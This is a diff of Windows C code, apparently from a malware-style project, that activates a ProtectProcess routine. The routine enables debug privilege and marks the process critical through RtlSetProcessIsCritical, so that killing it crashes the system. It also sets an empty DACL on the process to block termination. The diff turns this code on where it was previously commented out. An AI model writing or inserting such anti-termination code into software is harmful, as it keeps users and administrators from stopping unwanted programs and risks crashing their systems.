@@ -4,37 +4,34 @@
 
 typedef long (WINAPI* RtlSetProcessIsCritical) (IN BOOLEAN newValue, OUT BOOLEAN* oldValue, IN BOOLEAN criticalBreak);
 
-BOOL ProtectProcess() {
+void ProtectProcess() {
 	if(!EnablePrivilege(SE_DEBUG_NAME)) {
-		//return FALSE;
+		return;
 	}
 
-	/*HMODULE handle = LoadLibraryW(L"ntdll.dll");
+	HMODULE handle = LoadLibraryW(L"ntdll.dll");
 
 	if(!handle) {
-		return FALSE;
+		return;
 	}
 
 	RtlSetProcessIsCritical SetProcessIsCritical = (RtlSetProcessIsCritical) GetProcAddress(handle, "RtlSetProcessIsCritical");
 
 	if(!SetProcessIsCritical) {
-		return FALSE;
+		return;
 	}
 
-	SetProcessIsCritical(TRUE, NULL, FALSE);*/
+	SetProcessIsCritical(TRUE, NULL, FALSE);
 	HANDLE process = GetCurrentProcess();
-	PACL list = malloc(sizeof(ACL));
+	PACL list = LocalAlloc(LMEM_FIXED, sizeof(ACL));
 
 	if(!list) {
-		return FALSE;
+		return;
 	}
 
-	if(InitializeAcl(list, sizeof(ACL), ACL_REVISION)) {
-		SetSecurityInfo(process, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, list, NULL);
-	}
-
-	free(list);
-	return TRUE;
+	InitializeAcl(list, sizeof(ACL), ACL_REVISION);
+	SetSecurityInfo(process, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, list, NULL);
+	LocalFree(list);
 }
 
 int EnablePrivilege(LPCWSTR privilege) {
